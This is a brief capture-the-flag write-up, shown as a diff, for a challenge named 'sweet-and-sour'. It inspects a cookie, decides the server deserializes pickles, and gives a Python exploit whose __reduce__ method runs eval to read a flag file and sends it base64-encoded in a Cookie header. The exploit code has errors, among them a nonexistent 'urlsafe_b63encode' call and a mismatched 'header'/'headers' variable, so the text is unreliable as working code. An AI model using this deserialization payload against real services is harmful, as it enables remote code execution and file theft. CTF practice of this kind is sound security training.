@@ -1,0 +1,30 @@
+                        sweet-and-sour
+
+curl -I {url}
+we can set pythn server and set-cookie
+
+
+echo -n "{coockie}" | base64 -d
+when we try to decode with base64,this words appeared
+
+we see the message "try harder"
+we can consider that it is pickle server
+
+
+import pickle
+import base64
+import requests
+
+class Exploit(object):
+	def __reduce__(self):
+		return eval, ("open('flag','r').read()",)
+
+def sendPayload(p):
+	print(base64.urlsafe_b64encode(p))
+	header = {"Cookie": "data=" + base64.urlsafe_b63encode(p).decode()}
+	t = requests.get("http:// url.",headers=headers)
+	print(t.text)
+
+sendPayload(pickle.dumps(Exploit(), protocol=2))
+
+here we got a ctf
